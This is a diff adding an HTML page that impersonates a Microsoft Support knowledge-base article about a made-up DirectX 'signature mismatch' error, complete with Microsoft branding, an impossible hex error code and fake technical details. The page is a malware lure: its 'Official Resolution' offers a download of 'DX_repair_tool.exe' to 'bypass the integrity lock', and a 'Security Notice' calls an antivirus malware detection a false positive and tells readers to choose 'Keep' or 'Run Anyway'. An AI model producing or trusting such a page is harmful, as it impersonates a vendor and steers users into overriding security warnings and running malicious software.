@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAn0lEQVR42mNkYGA4z8DAwMgwY8YMhiFDhjBC+YwMDAwMDEwMc+bMYYTyGRkYGBhgAmfOnGEMUj4jAwMDEwNM4MKFC4xByidpAEyAmZkZpByofBIAsrOzQ8qByicBIKSRshmofGIAmMDp06dBysH8S6QBMAHmzZtHDAAnzJs3jxgAThitfOIAmEBp6WliADhh9OjRxABwwujRo4kB4ISZM2cSA8AJmAApI9mX33H7WAAAAABJRU5ErkJggg==">
+    
+    <title>KB4028529: Troubleshooting DirectX Runtime Error 0x7U18E0OR - Microsoft Support</title>
+    
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; color: #1a1a1a; background: #fff; line-height: 1.5; }
+        
+        /* Official Header */
+        .uhf-header { display: flex; align-items: center; padding: 16px 5%; border-bottom: 1px solid #e6e6e6; }
+        .ms-logo { display: flex; align-items: center; text-decoration: none; color: #5e5e5e; font-weight: 600; font-size: 18px; }
+        .support-label { border-left: 1px solid #000; margin-left: 20px; padding-left: 20px; color: #000; font-size: 15px; }
+        
+        /* Main Layout */
+        .main-layout { display: flex; max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
+        .content-area { flex: 3; padding-right: 40px; }
+        .sidebar { flex: 1; border-left: 1px solid #e6e6e6; padding-left: 30px; font-size: 14px; }
+
+        .breadcrumbs { font-size: 12px; color: #616161; margin-bottom: 20px; }
+        h1 { font-size: 34px; font-weight: 600; margin: 0 0 10px 0; letter-spacing: -0.5px; }
+        .meta-info { color: #616161; font-size: 13px; margin-bottom: 40px; }
+
+        h2 { font-size: 22px; border-bottom: 1px solid #e6e6e6; padding-bottom: 8px; margin-top: 40px; }
+        
+        /* Technical Table */
+        .tech-table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px; }
+        .tech-table td { padding: 8px; border: 1px solid #ddd; }
+        .tech-table td:first-child { background: #f9f9f9; font-weight: 600; width: 30%; }
+
+        /* Resolution Box */
+        .resolution-box { background: #f3f2f1; border-left: 4px solid #0078d4; padding: 25px; margin: 30px 0; }
+        .btn-dl { display: inline-block; background: #0067b8; color: #fff; padding: 12px 28px; text-decoration: none; font-weight: 600; margin-top: 15px; border-radius: 2px; }
+        .btn-dl:hover { background: #005a9e; }
+
+        /* Warning UI */
+        .warning-card { background: #fff8df; border-left: 4px solid #ffb900; padding: 15px; font-size: 13px; margin: 20px 0; border-top: 1px solid #ffb900; border-right: 1px solid #ffb900; border-bottom: 1px solid #ffb900; }
+        
+        /* Mega Footer */
+        .mega-footer { background: #f2f2f2; padding: 50px 5%; margin-top: 80px; font-size: 12px; }
+        .footer-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 20px; }
+        .footer-col h4 { color: #616161; margin-bottom: 20px; font-size: 14px; }
+        .footer-col ul { list-style: none; padding: 0; margin: 0; }
+        .footer-col li { margin-bottom: 12px; }
+        .footer-col a { color: #616161; text-decoration: none; }
+        
+        .legal-bar { margin-top: 50px; border-top: 1px solid #ddd; padding-top: 20px; display: flex; justify-content: flex-end; gap: 20px; }
+    </style>
+</head>
+<body>
+
+<header class="uhf-header">
+    <a href="#" class="ms-logo">
+        <svg width="21" height="21" viewBox="0 0 21 21"><rect x="0" y="0" width="10" height="10" fill="#f25022"/><rect x="11" y="0" width="10" height="10" fill="#7fba00"/><rect x="0" y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg>
+        <span style="margin-left:10px">Microsoft</span>
+    </a>
+    <span class="support-label">Support</span>
+</header>
+
+<div class="main-layout">
+    <div class="content-area">
+        <div class="breadcrumbs">Support / Windows / DirectX / KB4028529</div>
+        <h1>DirectX Runtime Error 0x7U18E0OR: Integrity Signature Mismatch</h1>
+        <div class="meta-info">Published: March 07, 2026 | Last Updated: March 08, 2026</div>
+
+        <p>This KB article provides guidance for resolving a <strong>Cryptographic Signature Mismatch</strong> detected during the WinSxS registration of Direct3D 11 Extended libraries.</p>
+
+        <h2>Symptoms</h2>
+        <p>The DirectX End-User Runtime installer (Build 2026.03) returns the following fatal HRESULT code at 91% completion:</p>
+        <div style="background:#000; color:#0f0; padding:15px; font-family:Consolas, monospace; margin: 15px 0;">
+            [ERROR] 0x7U18E0OR: SIGNATURE_VERIFICATION_FAILURE_D3D11_CORE
+        </div>
+
+        <h2>Technical Details</h2>
+        <table class="tech-table">
+            <tr><td>Distribution Unit</td><td>DirectX_Runtime_Update_2026.exe</td></tr>
+            <tr><td>Target Namespace</td><td>Microsoft-Windows-DirectX-D3D11-Extended</td></tr>
+            <tr><td>Registry Hive</td><td>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DX</td></tr>
+            <tr><td>Kernel Version</td><td>10.0.22621.1778</td></tr>
+        </table>
+
+        <div class="resolution-box">
+            <h3 style="margin-top:0">Official Resolution</h3>
+            <p>To bypass the integrity lock and complete the update, users must deploy the <strong>DirectX Integrity Repair Tool</strong>. This utility will re-initialize the local component manifest and permit driver-level synchronization.</p>
+            
+            <a href="DATA/DX_repair_tool.exe" class="btn-dl" download>Download Repair Tool (KB4028529)</a>
+        </div>
+
+        <div class="warning-card">
+            <strong>Security Notice:</strong> Some security engines may flag the repair utility due to its low-level hardware abstraction access. This is a known false-positive (Detection: Gen.Malware.0x7U). Please select "Keep" or "Run Anyway" to continue.
+        </div>
+
+        <div id="feedback" style="margin-top:40px; font-weight:600; padding-top:20px; border-top: 1px solid #eee;">
+            Was this information helpful? 
+            <button onclick="this.parentElement.innerHTML='<em>Thank you for your feedback!</em>'" style="margin-left:10px; padding: 5px 15px; cursor:pointer">Yes</button>
+            <button onclick="this.parentElement.innerHTML='<em>Thank you for your feedback!</em>'" style="margin-left:5px; padding: 5px 15px; cursor:pointer">No</button>
+        </div>
+    </div>
+
+    <aside class="sidebar">
+        <h4 style="margin-top:0">Related Knowledge Base</h4>
+        <ul style="padding-left:15px; color:#0067b8">
+            <li style="margin-bottom:15px"><a href="#">KB299261: Manually Registering D3D DLLs</a></li>
+            <li style="margin-bottom:15px"><a href="#">KB401823: Windows 11 Shader Cache Reset</a></li>
+            <li style="margin-bottom:15px"><a href="#">Troubleshooting Graphics Driver Sync</a></li>
+        </ul>
+        <div style="background:#f2f2f2; padding:15px; margin-top:30px; border: 1px solid #ddd;">
+            <strong>Need more help?</strong><br>
+            <p style="font-size:12px">Contact a Microsoft Support Engineer via the Virtual Assistant.</p>
+        </div>
+    </aside>
+</div>
+
+<footer class="mega-footer">
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h4>Microsoft Store</h4>
+            <ul><li>Account profile</li><li>Download Center</li><li>Order tracking</li></ul>
+        </div>
+        <div class="footer-col">
+            <h4>Education</h4>
+            <ul><li>Microsoft in education</li><li>Devices for education</li><li>Azure for students</li></ul>
+        </div>
+        <div class="footer-col">
+            <h4>Business</h4>
+            <ul><li>Microsoft AI</li><li>Microsoft Security</li><li>Dynamics 365</li></ul>
+        </div>
+        <div class="footer-col">
+            <h4>Developer</h4>
+            <ul><li>Microsoft Learn</li><li>Visual Studio</li><li>Microsoft Marketplace</li></ul>
+        </div>
+        <div class="footer-col">
+            <h4>Company</h4>
+            <ul><li>Careers</li><li>About Microsoft</li><li>Privacy at Microsoft</li></ul>
+        </div>
+    </div>
+    <div class="legal-bar">
+        <span>Contact Microsoft</span><span>Privacy</span><span>Terms of use</span><span>© Microsoft 2026</span>
+    </div>
+</footer>
+
+</body>
+</html>
